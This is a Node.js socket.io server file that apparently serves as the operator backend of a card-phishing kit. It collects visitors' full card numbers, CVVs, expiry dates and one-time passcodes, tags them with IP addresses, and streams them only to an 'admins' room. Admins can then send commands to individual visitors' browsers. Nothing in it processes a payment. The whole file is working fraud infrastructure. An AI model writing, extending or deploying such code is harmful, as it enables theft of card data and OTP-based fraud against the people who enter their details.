const express = require('express');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const port = process.env.PORT || 8080;
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  }
});

io.on('connection', (socket) => {

  // Global broadcast for any new connection
  const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
  io.emit('visitor_update', {
    id: socket.id,
    ip: clientIp,
    created_at: new Date().toISOString()
  });

  // Handler for an admin identifying themselves
  socket.on('admin_hello', () => {
    socket.join('admins');
  });

  // Handler for card data from a user
  socket.on('card_submission', (payload) => {

    // Validate required fields
    const requiredFields = ['card_number', 'expiry_month', 'expiry_year', 'cvv', 'card_holder', 'amount'];
    const missingFields = requiredFields.filter(field => !payload[field]);
    
    if (missingFields.length > 0) {
      console.error('Missing required fields:', missingFields);
      return;
    }

    // Format the submission data
    const submissionPayload = {
      id: socket.id, // Use socket ID as unique identifier
      socket_id: socket.id, // Also include as socket_id for clarity
      ...payload,
      user_ip: clientIp,
      created_at: new Date().toISOString(),
      status: 'pending'
    };

    // Add card type detection
    const cardNumber = payload.card_number.replace(/\s/g, '');
    submissionPayload.card_type = detectCardType(cardNumber);

    // Send the data ONLY to admins
    io.to('admins').emit('card_submission', submissionPayload);
  });

  // Helper function to detect card type
  function detectCardType(cardNumber) {
    if (cardNumber.startsWith('4')) return 'Visa';
    if (cardNumber.startsWith('5')) return 'MasterCard';
    if (cardNumber.startsWith('6')) return 'Discover';
    if (cardNumber.startsWith('3')) return 'American Express';
    return 'Unknown';
  }

  // Handler for commands from an admin
  socket.on('admin_command', (payload) => {
    
    // Get the target socket ID from the payload
    const targetSocketId = payload.submission_id;
    
    if (!targetSocketId) {
      console.log('No target socket ID provided, broadcasting to all users');
      // Broadcast to all users except admins
      io.to('admins').emit('admin_command', payload);
      return;
    }

    // Get the target socket
    const targetSocket = io.sockets.sockets.get(targetSocketId);
    
    if (!targetSocket) {
      console.log('Target socket not found:', targetSocketId);
      return;
    }

    // Send command to specific user
    console.log('Sending command to target socket:', targetSocketId);
    targetSocket.emit('admin_command', payload);
  });

  // Handler for OTPs from a user
  socket.on('otp_submitted', (payload) => {
    const otpPayload = {
      ...payload,
      id: socket.id // Tag with user's socket ID
    };
    // Send the OTP ONLY to admins
    io.to('admins').emit('otp_submitted', otpPayload);
  });

  // Chat handlers remain global broadcasts
  socket.on('chat_message', (payload) => {
    io.emit('chat_message', payload);
  });

  socket.on('start_chat', (payload) => {
    io.emit('start_chat', payload);
  });

  // Global broadcast for a client disconnecting
  socket.on('disconnect', () => {
    io.emit('visitor_left', { id: socket.id });
  });
});

// Serve static files from the dist directory
app.use(express.static(path.join(__dirname, 'dist')));

// For any route, serve index.html (for React Router support)
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

server.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
